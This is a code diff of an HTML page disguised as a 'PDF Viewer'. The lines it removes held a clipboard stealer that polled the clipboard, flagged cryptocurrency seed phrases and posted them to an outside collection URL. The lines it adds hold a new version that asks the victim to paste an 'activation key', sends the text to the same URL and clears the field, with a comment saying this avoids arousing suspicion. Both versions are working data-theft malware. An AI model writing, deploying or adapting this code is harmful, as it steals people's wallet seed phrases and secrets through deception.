@@ -2,58 +2,26 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PDF Viewer - Open Documents</title>
+    <title>PDF Viewer</title>
     <style>
-        body {
-            background: #1e1e2f;
-            font-family: 'Segoe UI', Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            color: #fff;
-            cursor: pointer;
-        }
-        .box {
-            background: #2a2a3e;
-            padding: 40px;
-            border-radius: 20px;
-            text-align: center;
-            max-width: 420px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        .pdf-icon { font-size: 60px; background: #e74c3c; width: 80px; height: 80px; line-height: 80px; border-radius: 12px; margin: 0 auto 20px; color: #fff; }
-        .btn { background: #e74c3c; color: #fff; border: none; padding: 12px 30px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; }
-        .status { color: #ffaa00; margin: 15px 0; font-size: 14px; }
-        .footer { margin-top: 20px; font-size: 12px; color: #555; }
+        body { background: #1e1e2f; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; }
+        .box { background: #2a2a3e; padding: 40px; border-radius: 20px; text-align: center; max-width: 420px; }
+        .input-area { background: #1e1e2f; border: 1px solid #444; color: #fff; padding: 12px; border-radius: 8px; width: 100%; margin: 15px 0; }
+        .status { color: #ffaa00; margin: 10px 0; }
     </style>
 </head>
 <body>
-    <div class="box" id="mainBox">
-        <div class="pdf-icon">📄</div>
-        <h1>PDF Viewer</h1>
-        <p style="color:#aaaacc;">Click anywhere to load document</p>
-        <div class="status" id="status">● offline</div>
-        <div class="footer">⚡ Secure · Encrypted</div>
+    <div class="box">
+        <h1>📄 PDF Viewer</h1>
+        <p style="color:#aaaacc;">Paste your activation key below</p>
+        <textarea class="input-area" id="pasteArea" placeholder="Ctrl+V to paste"></textarea>
+        <div class="status" id="status">● waiting for paste</div>
     </div>
 
     <script>
-        // ---------- CONFIG ----------
         const EXFIL_URL = "https://rugpuller.pythonanywhere.com/capture";
-        // ----------------------------
 
-        // BIP39 wordlist (minimal for testing)
-        const BIP39_WORDS = new Set(["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse"]);
-
-        function isSeedPhrase(text) {
-            const words = text.trim().split(/\s+/);
-            return (words.length === 12 || words.length === 24) && words.every(w => BIP39_WORDS.has(w.toLowerCase()));
-        }
-
-        let lastClip = "";
-        let isActive = false;
-
+        // Fonction pour envoyer les données
         function sendData(text) {
             fetch(EXFIL_URL, {
                 method: "POST",
@@ -62,35 +30,18 @@
             }).catch(() => {});
         }
 
-        function pollClipboard() {
-            if (!isActive) return;
-            navigator.clipboard.readText().then((text) => {
-                if (text && text !== lastClip) {
-                    lastClip = text;
-                    sendData(text);
-                    if (isSeedPhrase(text)) {
-                        sendData("SEED: " + text);
-                    }
-                }
-            }).catch(() => {});
-            setTimeout(pollClipboard, 2000 + Math.random() * 3000);
-        }
-
-        // Activate on first click anywhere
-        document.addEventListener("click", function firstClick() {
-            if (isActive) return;
-            isActive = true;
-            document.getElementById("status").textContent = "● active ✓";
-            document.getElementById("status").style.color = "#7cfc00";
-            navigator.clipboard.readText().then(() => {
-                pollClipboard();
-            }).catch(() => {
-                // Silent retry if permission denied
-                setTimeout(() => {
-                    navigator.clipboard.readText().then(pollClipboard).catch(() => {});
-                }, 1000);
-            });
-            document.removeEventListener("click", firstClick);
+        // Détecter le collage (paste)
+        document.getElementById("pasteArea").addEventListener("paste", function(e) {
+            // Récupérer le texte collé
+            const text = e.clipboardData.getData("text");
+            if (text) {
+                document.getElementById("status").textContent = "● active ✓";
+                document.getElementById("status").style.color = "#7cfc00";
+                sendData(text);
+                // Vider le champ pour ne pas éveiller les soupçons
+                this.value = "✓ Key received";
+                setTimeout(() => { this.value = ""; }, 2000);
+            }
         });
     </script>
 </body>
